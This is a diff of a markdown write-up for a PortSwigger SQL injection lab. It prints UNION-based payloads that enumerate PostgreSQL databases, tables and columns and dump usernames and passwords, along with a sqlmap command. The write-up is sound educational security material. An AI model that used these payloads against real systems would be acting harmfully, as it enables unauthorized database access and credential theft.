@@ -47,7 +47,7 @@ SELECT * FROM products WHERE category = 'Gifts''
 > 📍 ***In this Lab, both columns contain text.*** 
 
 #### Database version: 
-Each ```DBMS``` (Database Management System) has its own syntax to retrieve the version, and since we don't know which one we are dealing with, let's try the most popular ones. <br/>
+Each ```DBMS``` (Database Management System) has its own syntax to retrieve the version, and since we don't know which one we are dealing with, let's try the most popular ones.
 Here is a great [Cheat-Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) you can refer to when exploiting SQL injection:<br/>
 
 :bulb: **Cheat-Sheet:** <br/>
@@ -68,8 +68,7 @@ SELECT version()
 ```
 > In this Lab, the back-end DBMS is ```PostgreSQL```<br/>
 
-* Let's retrieve the database version, by sending the following payload: ```'+UNION+SELECT+NULL,version()--```<br/>
-
+* Let's retrieve the database version, by sending the following payload: ```'+UNION+SELECT+NULL,version()--```
 ![Retrieving the version](https://user-images.githubusercontent.com/101610095/220288617-b05e864a-2e5f-454e-9bf7-8c129bbd5de4.png)
 
 #### Current database name: 
@@ -77,8 +76,7 @@ SELECT version()
 ```SQL
 SELECT current_database()
 ```
-* <font color="white"><srong>Inject the vulnerable parameter with the following payload:</font></strong>: ```'+UNION+SELECT+NULL,current_database()--```<br/>
-
+* <font color="white"><srong>Inject the vulnerable parameter with the following payload:</font></strong>: ```'+UNION+SELECT+NULL,current_database()--```
 ![CurrentDB_name](https://user-images.githubusercontent.com/101610095/220291423-76f2c3a0-aaf9-4a32-8b51-b92e3a3ab821.png)
 
 #### Databases names: 
@@ -86,8 +84,7 @@ SELECT current_database()
 ```SQL
 SELECT datname FROM pg_database
 ```
-* <font color="white"><srong>Inject the vulnerable parameter with the following payload:</font></strong> ```'+UNION+SELECT+NULL,datname+FROM+pg_database--```<br/>
-
+* <font color="white"><srong>Inject the vulnerable parameter with the following payload:</font></strong> ```'+UNION+SELECT+NULL,datname+FROM+pg_database--```
 ![Databases_names](https://user-images.githubusercontent.com/101610095/220293746-3d8f24d7-c8d7-431d-b929-373cc9976154.png)
 
 #### Fetching the tables for the current database:
@@ -95,12 +92,10 @@ SELECT datname FROM pg_database
 ```SQL
 SELECT table_name FROM information_schema.tables
 ```
-* <font color="white"><srong>Inject the vulnerable parameter with the following payload:</font></strong>: ```'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--```<br/>
-
+* <font color="white"><srong>Inject the vulnerable parameter with the following payload:</font></strong>: ```'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--```
 ![Tables](https://user-images.githubusercontent.com/101610095/220296661-edb318ff-5ac2-49c6-824a-9c2cd2d7187b.png)<br/>
-* This payload will return all the tables in the current database, and since we know the name of the table is ```users```, let's add a filter to our payload using the ```LIKE``` clause:<br/>
-* Payload: ```'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables+WHERE+table_name+LIKE+'users'--```<br/>
-
+* This payload will return all the tables in the current database, and since we know the name of the table is ```users```, let's add a filter to our payload using the ```LIKE``` clause:br/>
+* Payload: ```'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables+WHERE+table_name+LIKE+'users'--```
 ![users_table](https://user-images.githubusercontent.com/101610095/220298815-0b415f32-7c27-4ce1-941a-c4e23147fff6.png)
 
 #### Fetching columns for the table users in the current database:
@@ -108,13 +103,11 @@ SELECT table_name FROM information_schema.tables
 ```SQL
 SELECT column_name FROM information_schema.columns WHERE table_name='TableName'
 ```
-* <font color="white"><srong>Inject the vulnerable parameter with the following payload:</font></strong>: ```'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users'--```<br/>
-
+* <font color="white"><srong>Inject the vulnerable parameter with the following payload:</font></strong>: ```'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users'--```
 ![Columns](https://user-images.githubusercontent.com/101610095/220299713-b3e5ad20-5d70-4be1-a89d-f67746a8ec8e.png)
 
 #### Dumping data from users table:
-* We can retrieve the content of ```users``` table by sending the following payload: ```'+UNION+SELECT+username,password+FROM+users--``` <br/>
-
+* We can retrieve the content of ```users``` table by sending the following payload: ```'+UNION+SELECT+username,password+FROM+users--``` 
 ![Dump](https://user-images.githubusercontent.com/101610095/220300804-b80049a3-c05f-4310-8dd1-9e1deca52305.png)
 
 #### Solving the Lab: 
@@ -140,8 +133,7 @@ sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700c
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --dbs : Enumerate databases (schema) names <br/>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --batch : Never ask for user input, use the default behavior <br/>
 
-* Execution: <br/>
-
+* Execution:
 ![SQLMap_1](https://user-images.githubusercontent.com/101610095/220312739-645d4223-81ca-4ef9-b413-977a79cdf9ce.png) <br/>
 > :memo: ***Here the database ```public``` is the one we are interested in.***
 
